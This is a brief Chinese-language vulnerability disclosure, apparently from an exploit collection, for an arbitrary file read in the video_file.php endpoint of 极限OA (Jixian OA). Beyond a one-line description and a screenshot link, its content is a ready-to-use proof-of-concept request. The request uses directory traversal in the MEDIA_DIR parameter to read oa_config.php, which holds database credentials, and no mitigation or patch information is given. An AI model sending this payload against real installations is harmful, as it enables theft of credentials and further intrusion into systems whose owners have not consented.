## 极限OA接口video_file.php存在任意文件读取漏洞

极限OA video_file.php 处存在任意文件读取，攻击者可以从其中获取网站路径和数据库账号密码等敏感信息进一步攻击。

## poc

```
/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php 
```

![image-20240621191009647](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406211910698.png)